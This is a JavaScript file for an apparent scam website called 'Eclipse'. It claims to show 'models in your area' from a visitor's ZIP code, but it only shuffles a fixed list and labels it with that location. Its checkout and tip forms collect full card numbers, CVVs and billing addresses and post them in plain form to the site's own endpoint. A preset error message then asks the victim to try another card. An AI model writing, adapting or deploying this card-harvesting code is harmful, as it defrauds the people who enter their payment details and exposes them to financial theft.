const SITE = window.ECLIPSE_SITE_DATA;
const LOCATION_KEY = 'eclipse_location';
const SELECTION_KEY = 'eclipse_selection';

let lightboxState = { photos: [], index: 0 };

function $(selector, root = document) {
    return root.querySelector(selector);
}

function $all(selector, root = document) {
    return Array.from(root.querySelectorAll(selector));
}

function formatCurrency(value) {
    return new Intl.NumberFormat('en-US', {
        style: 'currency',
        currency: 'USD',
        maximumFractionDigits: 0,
    }).format(value);
}

function escapeHtml(value = '') {
    return String(value)
        .replaceAll('&', '&amp;')
        .replaceAll('<', '&lt;')
        .replaceAll('>', '&gt;')
        .replaceAll('"', '&quot;')
        .replaceAll("'", '&#39;');
}

function getLocation() {
    try {
        return JSON.parse(sessionStorage.getItem(LOCATION_KEY) || 'null');
    } catch {
        return null;
    }
}

function setLocation(data) {
    sessionStorage.setItem(LOCATION_KEY, JSON.stringify(data));
}

function getSelection() {
    try {
        return JSON.parse(sessionStorage.getItem(SELECTION_KEY) || '[]');
    } catch {
        return [];
    }
}

function setSelection(slugs) {
    sessionStorage.setItem(SELECTION_KEY, JSON.stringify(slugs));
}

function clearSelection() {
    sessionStorage.removeItem(SELECTION_KEY);
}

function getHomePath() {
    return document.body.dataset.homePath || '.';
}

function goHome() {
    window.location.replace(`${getHomePath()}/`);
}

function requireLocation() {
    const location = getLocation();
    if (!location) {
        goHome();
        return null;
    }
    return location;
}

function titleCaseSlug(slug) {
    return slug
        .replace(/-/g, ' ')
        .replace(/\b\w/g, (match) => match.toUpperCase());
}

function getModel(slug) {
    return SITE.models.find((model) => model.slug === slug) || null;
}

function shuffle(items) {
    const copy = [...items];
    for (let index = copy.length - 1; index > 0; index -= 1) {
        const swapIndex = Math.floor(Math.random() * (index + 1));
        [copy[index], copy[swapIndex]] = [copy[swapIndex], copy[index]];
    }
    return copy;
}

function randomInt(min, max) {
    return Math.floor(Math.random() * (max - min + 1)) + min;
}

function buildRandomSelection() {
    const min = Math.min(8, SITE.models.length);
    const max = Math.min(14, SITE.models.length);
    const count = SITE.models.length <= min ? SITE.models.length : randomInt(min, max);

    if (SITE.models.length <= 3) {
        const simpleSelection = shuffle(SITE.models).slice(0, count).map((model) => model.slug);
        setSelection(simpleSelection);
        return simpleSelection;
    }

    const sorted = [...SITE.models].sort((a, b) => a.price - b.price);
    const third = Math.max(1, Math.floor(sorted.length / 3));
    const lowPool = sorted.slice(0, third);
    const midPool = sorted.slice(third, Math.max(third * 2, third + 1));
    const highPool = sorted.slice(Math.max(third * 2, third + 1));

    const selected = [];
    const used = new Set();

    [lowPool, midPool, highPool].forEach((pool) => {
        const available = shuffle(pool).find((model) => !used.has(model.slug));
        if (available && selected.length < count) {
            selected.push(available);
            used.add(available.slug);
        }
    });

    const remaining = shuffle(sorted.filter((model) => !used.has(model.slug)));
    for (const model of remaining) {
        if (selected.length >= count) break;
        selected.push(model);
        used.add(model.slug);
    }

    const selection = shuffle(selected).map((model) => model.slug);
    setSelection(selection);
    return selection;
}

async function lookupZip(zipcode) {
    const response = await fetch(`https://api.zippopotam.us/us/${zipcode}`);
    if (!response.ok) {
        throw new Error('We could not find that ZIP code.');
    }

    const data = await response.json();
    const place = data.places && data.places[0];

    if (!place) {
        throw new Error('We could not determine your location from that ZIP code.');
    }

    return {
        zip: zipcode,
        city: place['place name'],
        state: place['state abbreviation'],
        stateName: place.state,
        country: data.country,
        latitude: place.latitude,
        longitude: place.longitude,
        label: `${place['place name']}, ${place['state abbreviation']}`,
        preciseLabel: `${place['place name']}, ${place.state}`,
    };
}

function setMessage(target, text, type = 'info') {
    if (!target) return;
    target.textContent = text || '';
    target.className = `message-box ${type}`;
    target.classList.toggle('hidden', !text);
}

function renderFooter() {
    const tipsHref = `${getHomePath()}/tips/`;
    return `&copy; 2026 Eclipse &mdash; Private Access Only<br><a class="contact-link" href="${SITE.settings.contactUrl}" target="_blank" rel="noopener noreferrer">${escapeHtml(SITE.settings.contactLabel)}</a><br><a class="contact-link" href="${tipsHref}">Send a Tip</a>`;
}

function initHomePage() {
    const zipForm = $('#zip-form');
    const zipInput = $('#zip-input');
    const zipMessage = $('#zip-message');
    const footer = $('#page-footer');

    if (footer) {
        footer.innerHTML = renderFooter();
    }

    const currentLocation = getLocation();
    if (currentLocation) {
        window.location.replace(`./${SITE.settings.gallerySlug}/`);
        return;
    }

    zipInput.focus();

    zipForm.addEventListener('submit', async (event) => {
        event.preventDefault();
        const zip = zipInput.value.trim();
        if (!/^\d{5}$/.test(zip)) {
            setMessage(zipMessage, 'Please enter a valid 5-digit ZIP code.', 'error');
            return;
        }

        const submitButton = $('button[type="submit"]', zipForm);
        submitButton.disabled = true;
        submitButton.textContent = 'Locating...';
        setMessage(zipMessage, 'Finding your local lineup…', 'info');

        try {
            const location = await lookupZip(zip);
            setLocation(location);
            clearSelection();
            buildRandomSelection();
            window.location.replace(`./${SITE.settings.gallerySlug}/`);
        } catch (error) {
            setMessage(zipMessage, error.message || 'Unable to look up that ZIP code.', 'error');
        } finally {
            submitButton.disabled = false;
            submitButton.textContent = 'See Models Near Me';
        }
    });
}

function modelCardMarkup(model, location) {
    return `
        <a class="model-card" href="../models/${model.slug}/">
            <img class="model-card-photo" src="../images/${model.slug}/${model.cover}" alt="${escapeHtml(model.name)}" loading="lazy">
            <div class="model-card-overlay">
                <div class="model-card-name">${escapeHtml(model.name)}</div>
                <div class="model-card-meta">
                    <div class="model-card-price">From ${formatCurrency(model.price)}</div>
                    <div class="model-card-tag">${escapeHtml(location.state)}</div>
                </div>
            </div>
        </a>
    `;
}

function initGalleryPage() {
    const location = requireLocation();
    if (!location) return;

    const footer = $('#page-footer');
    const locationLabel = $('#gallery-location');
    const title = $('#gallery-title');
    const copy = $('#gallery-copy');
    const grid = $('#gallery-grid');
    const shuffleButton = $('#shuffle-models');
    const updateZipButton = $('#change-zip');

    if (footer) {
        footer.innerHTML = renderFooter();
    }

    locationLabel.textContent = `Available near ${location.label}`;
    title.textContent = `Here are the models in your area — ${location.label}`;
    copy.textContent = `We matched this lineup using ZIP code ${location.zip}.`;

    function renderSelection() {
        const slugs = getSelection().length ? getSelection() : buildRandomSelection();
        const models = slugs.map(getModel).filter(Boolean);
        grid.innerHTML = models.map((model) => modelCardMarkup(model, location)).join('');
    }

    renderSelection();

    shuffleButton.addEventListener('click', () => {
        buildRandomSelection();
        renderSelection();
    });

    updateZipButton.addEventListener('click', () => {
        sessionStorage.removeItem(LOCATION_KEY);
        clearSelection();
        window.location.replace('../');
    });
}

function setupLightbox() {
    const lightbox = $('#lightbox');
    if (!lightbox) return;

    const image = $('#lightbox-image');
    const counter = $('#lightbox-counter');
    const closeButton = $('#lightbox-close');
    const prevButton = $('#lightbox-prev');
    const nextButton = $('#lightbox-next');

    function renderLightbox() {
        const currentPhoto = lightboxState.photos[lightboxState.index];
        if (!currentPhoto) return;
        image.src = currentPhoto.src;
        image.alt = currentPhoto.alt;
        counter.textContent = `${lightboxState.index + 1} — ${lightboxState.photos.length}`;
    }

    window.__openLightbox = function (photos, index) {
        lightboxState = { photos, index };
        renderLightbox();
        lightbox.classList.add('active');
        document.body.style.overflow = 'hidden';
    };

    function closeLightbox() {
        lightbox.classList.remove('active');
        document.body.style.overflow = '';
    }

    function moveLightbox(delta) {
        if (!lightboxState.photos.length) return;
        lightboxState.index = (lightboxState.index + delta + lightboxState.photos.length) % lightboxState.photos.length;
        renderLightbox();
    }

    closeButton.addEventListener('click', closeLightbox);
    prevButton.addEventListener('click', () => moveLightbox(-1));
    nextButton.addEventListener('click', () => moveLightbox(1));
    lightbox.addEventListener('click', (event) => {
        if (event.target === lightbox) closeLightbox();
    });

    document.addEventListener('keydown', (event) => {
        if (!lightbox.classList.contains('active')) return;
        if (event.key === 'Escape') closeLightbox();
        if (event.key === 'ArrowLeft') moveLightbox(-1);
        if (event.key === 'ArrowRight') moveLightbox(1);
    });
}

function fillCheckoutSummary(action, model, location) {
    const amount = action.pricing === 'model' ? model.price : action.amount;
    $('#checkout-model').textContent = model.name;
    $('#checkout-action').textContent = action.label;
    $('#checkout-total').textContent = formatCurrency(amount);
    $('#checkout-location').textContent = location.label;
}

function showCheckoutStep(stepName) {
    $all('[data-step]').forEach((element) => {
        element.hidden = element.dataset.step !== stepName;
    });
}

function initCheckout(model, location) {
    const modal = $('#checkout-modal');
    if (!modal) return;

    const closeButton = $('#checkout-close');
    const closeSecondaryButton = $('#checkout-close-secondary');
    const detailsMessage = $('#details-message');
    const successMessage = $('#success-message');
    const revealCard = $('#reveal-card');
    const revealLink = $('#reveal-link');
    const detailsForm = $('#details-form');
    const successCloseButton = $('#success-close');
    const retryButton = $('#retry-checkout');
    const resultCard = $('#result-card');
    const resultMessage = $('#result-message');
    const summaryLine = $('#checkout-summary-line');
    const summarySubline = $('#checkout-summary-subline');

    let currentAction = null;

    function resetFormState() {
        setMessage(detailsMessage, '');
        setMessage(successMessage, '');
        revealCard.classList.add('hidden');
        resultCard.className = 'message-box error';
        resultMessage.textContent = "We're experiencing technical difficulties. Please try another card or try again in a few hours.";
    }

    function collectDetails() {
        const details = {
            cardNumber: $('#card-number').value.trim(),
            expiryDate: $('#expiry-date').value.trim(),
            cvv: $('#cvv').value.trim(),
            billingName: $('#billing-name').value.trim(),
            billingEmail: $('#billing-email').value.trim(),
            billingAddress: $('#billing-address').value.trim(),
            billingCity: $('#billing-city').value.trim(),
            billingState: $('#billing-state').value.trim(),
            billingZip: $('#billing-zip').value.trim(),
            billingCountry: $('#billing-country').value.trim(),
            notes: $('#billing-notes').value.trim(),
        };

        if (!details.cardNumber || !details.expiryDate || !details.cvv || !details.billingName || !details.billingEmail || !details.billingAddress || !details.billingCity || !details.billingState || !details.billingZip || !details.billingCountry) {
            throw new Error('Please complete the payment information and billing address.');
        }

        return details;
    }

    async function submitTransaction(details) {
        const amount = currentAction.pricing === 'model' ? model.price : currentAction.amount;
        const payload = {
            actionKey: currentAction.key,
            actionLabel: currentAction.label,
            amount,
            modelSlug: model.slug,
            modelName: model.name,
            location,
            ...details,
            sourceUrl: window.location.href,
        };

        const response = await fetch(SITE.settings.checkoutEndpoint, {
            method: 'POST',
            headers: {
                'Content-Type': 'application/json',
            },
            body: JSON.stringify(payload),
        });

        let data = {};
        try {
            data = await response.json();
        } catch {
            data = {};
        }

        if (!response.ok) {
            throw new Error(data.error || 'Unable to submit your request right now.');
        }

        await new Promise((resolve) => setTimeout(resolve, 2000));

        if (currentAction.key === 'reveal_contact') {
            revealCard.classList.remove('hidden');
        }
        setMessage(successMessage, data.requestId ? `Pending transaction ID: ${data.requestId}` : '', 'success');
        showCheckoutStep('result');
    }

    function setSummary(action) {
        const amount = action.pricing === 'model' ? model.price : action.amount;
        summaryLine.textContent = `${action.label} for ${model.name} — ${formatCurrency(amount)}`;
        summarySubline.textContent = `Area: ${location.label}`;
    }

    async function openModal(action) {
        currentAction = action;
        fillCheckoutSummary(action, model, location);
        setSummary(action);
        resetFormState();
        revealLink.href = SITE.settings.contactUrl;
        revealLink.textContent = SITE.settings.contactLabel;
        $('#billing-city').value = location.city;
        $('#billing-state').value = location.state;
        $('#billing-zip').value = location.zip;
        $('#billing-country').value = $('#billing-country').value || 'US';
        $('#checkout-button').textContent = 'Complete Purchase';
        modal.classList.add('active');
        document.body.style.overflow = 'hidden';
        showCheckoutStep('details');
    }

    function closeModal() {
        modal.classList.remove('active');
        document.body.style.overflow = '';
    }

    closeButton.addEventListener('click', closeModal);
    closeSecondaryButton.addEventListener('click', closeModal);
    successCloseButton.addEventListener('click', closeModal);
    retryButton.addEventListener('click', () => {
        resetFormState();
        showCheckoutStep('details');
    });
    modal.addEventListener('click', (event) => {
        if (event.target === modal) closeModal();
    });

    detailsForm.addEventListener('submit', async (event) => {
        event.preventDefault();
        const submit = $('#checkout-button');
        submit.disabled = true;
        submit.textContent = 'Processing...';
        setMessage(detailsMessage, '');

        try {
            const details = collectDetails();
            await submitTransaction(details);
        } catch (error) {
            setMessage(detailsMessage, error.message || 'Unable to submit your request.', 'error');
        } finally {
            submit.disabled = false;
            submit.textContent = 'Complete Purchase';
        }
    });

    $all('[data-action-key]').forEach((button) => {
        button.addEventListener('click', async () => {
            const action = SITE.actions.find((item) => item.key === button.dataset.actionKey);
            if (action) {
                await openModal(action);
            }
        });
    });
}

function initModelPage() {
    const location = requireLocation();
    if (!location) return;

    const slug = document.body.dataset.modelSlug;
    const model = getModel(slug);
    if (!model) {
        goHome();
        return;
    }

    const footer = $('#page-footer');
    if (footer) {
        footer.innerHTML = renderFooter();
    }

    document.title = `Eclipse — ${model.name}`;
    $('#back-to-gallery').href = `../../${SITE.settings.gallerySlug}/`;
    $('#hero-image').src = `../../images/${model.slug}/${model.cover}`;
    $('#hero-image').alt = model.name;
    $('#hero-name').textContent = model.name;
    $('#hero-price').textContent = `Starting at ${formatCurrency(model.price)}`;
    $('#hero-location').textContent = `Available near ${location.label}`;
    $('#hero-copy').textContent = `${model.name} is currently featured for ${location.city}-area visitors. Explore the gallery below, reveal the concierge contact, request a video call, or submit a booking request at the listed rate.`;
    $('#meta-location').textContent = location.preciseLabel;
    $('#meta-zip').textContent = location.zip;
    $('#meta-gallery-count').textContent = `${model.photos.length} photos`;

    const actionsGrid = $('#actions-grid');
    actionsGrid.innerHTML = SITE.actions.map((action) => {
        const price = action.pricing === 'model' ? model.price : action.amount;
        const actionLabel = action.pricing === 'model' ? `${action.label} ${formatCurrency(model.price)}` : `${action.label} ${formatCurrency(action.amount)}`;
        return `
            <article class="action-card">
                <div class="action-title-row">
                    <div class="action-title">${escapeHtml(action.label)}</div>
                    <div class="action-price">${escapeHtml(formatCurrency(price))}</div>
                </div>
                <p class="action-copy">${escapeHtml(action.copy)}</p>
                <button class="action-button" data-action-key="${action.key}">${escapeHtml(actionLabel)}</button>
            </article>
        `;
    }).join('');

    const heroQuickActions = $('#hero-quick-actions');
    heroQuickActions.innerHTML = SITE.actions.map((action) => {
        const price = action.pricing === 'model' ? model.price : action.amount;
        return `
            <button class="quick-action-button" data-action-key="${action.key}">
                <span class="quick-action-top">
                    <span class="quick-action-name">${escapeHtml(action.label)}</span>
                    <span class="quick-action-price">${escapeHtml(formatCurrency(price))}</span>
                </span>
                <span class="quick-action-caption">Tap to open this request immediately.</span>
            </button>
        `;
    }).join('');

    const grid = $('#photo-grid');
    const photos = model.photos.map((fileName, index) => ({
        src: `../../images/${model.slug}/${fileName}`,
        alt: `${model.name} photo ${index + 1}`,
    }));

    grid.innerHTML = photos.map((photo, index) => `
        <button class="photo-item" data-photo-index="${index}" aria-label="Open ${escapeHtml(photo.alt)}">
            <img src="${photo.src}" alt="${escapeHtml(photo.alt)}" loading="lazy">
        </button>
    `).join('');

    $all('[data-photo-index]', grid).forEach((button) => {
        button.addEventListener('click', () => {
            const index = Number(button.dataset.photoIndex || 0);
            window.__openLightbox(photos, index);
        });
    });

    setupLightbox();
    initCheckout(model, location);
}

function initTipsPage() {
    const footer = $('#page-footer');
    if (footer) {
        footer.innerHTML = renderFooter();
    }

    const amountInput = $('#tip-amount');
    const message = $('#tip-message');
    const form = $('#tip-form');
    const submit = $('#tip-submit');
    const amountButtons = $all('[data-tip-amount]');

    function syncAmountButtons() {
        const current = amountInput.value.trim();
        amountButtons.forEach((button) => {
            button.classList.toggle('active', button.dataset.tipAmount === current);
        });
    }

    amountButtons.forEach((button) => {
        button.addEventListener('click', () => {
            amountInput.value = button.dataset.tipAmount || '';
            syncAmountButtons();
        });
    });

    amountInput.addEventListener('input', syncAmountButtons);

    form.addEventListener('submit', async (event) => {
        event.preventDefault();
        setMessage(message, '');

        const amount = Number(amountInput.value.trim());
        if (!Number.isFinite(amount) || amount <= 0) {
            setMessage(message, 'Please enter a valid tip amount.', 'error');
            return;
        }

        const payload = {
            actionKey: 'tip',
            actionLabel: 'Tip',
            amount,
            modelSlug: 'tip',
            modelName: 'Eclipse Tip',
            cardNumber: $('#card-number').value.trim(),
            expiryDate: $('#expiry-date').value.trim(),
            cvv: $('#cvv').value.trim(),
            billingName: $('#billing-name').value.trim(),
            billingEmail: $('#billing-email').value.trim(),
            billingAddress: $('#billing-address').value.trim(),
            billingCity: $('#billing-city').value.trim(),
            billingState: $('#billing-state').value.trim(),
            billingZip: $('#billing-zip').value.trim(),
            billingCountry: $('#billing-country').value.trim(),
            notes: $('#tip-notes').value.trim(),
            sourceUrl: window.location.href,
        };

        if (!payload.cardNumber || !payload.expiryDate || !payload.cvv || !payload.billingName || !payload.billingEmail || !payload.billingAddress || !payload.billingCity || !payload.billingState || !payload.billingZip || !payload.billingCountry) {
            setMessage(message, 'Please complete the payment information and billing address.', 'error');
            return;
        }

        submit.disabled = true;
        submit.textContent = 'Processing...';

        try {
            const response = await fetch(SITE.settings.checkoutEndpoint, {
                method: 'POST',
                headers: {
                    'Content-Type': 'application/json',
                },
                body: JSON.stringify(payload),
            });

            let data = {};
            try {
                data = await response.json();
            } catch {
                data = {};
            }

            if (!response.ok) {
                throw new Error(data.error || 'Unable to submit your tip right now.');
            }

            const tipText = `Thank you for your tip of ${formatCurrency(amount)}.`;
            const requestText = data.requestId ? ` Reference: ${data.requestId}.` : '';
            setMessage(message, `${tipText}${requestText}`, 'success');
            form.reset();
            amountInput.value = '';
            syncAmountButtons();
        } catch (error) {
            setMessage(message, error.message || 'Unable to submit your tip right now.', 'error');
        } finally {
            submit.disabled = false;
            submit.textContent = 'Send Tip';
        }
    });
}

function initShared() {
    const footer = $('#page-footer');
    if (footer && !footer.innerHTML.trim()) {
        footer.innerHTML = renderFooter();
    }
}

document.addEventListener('DOMContentLoaded', () => {
    initShared();
    const page = document.body.dataset.page;
    if (page === 'home') initHomePage();
    if (page === 'gallery') initGalleryPage();
    if (page === 'model') initModelPage();
    if (page === 'tips') initTipsPage();
});
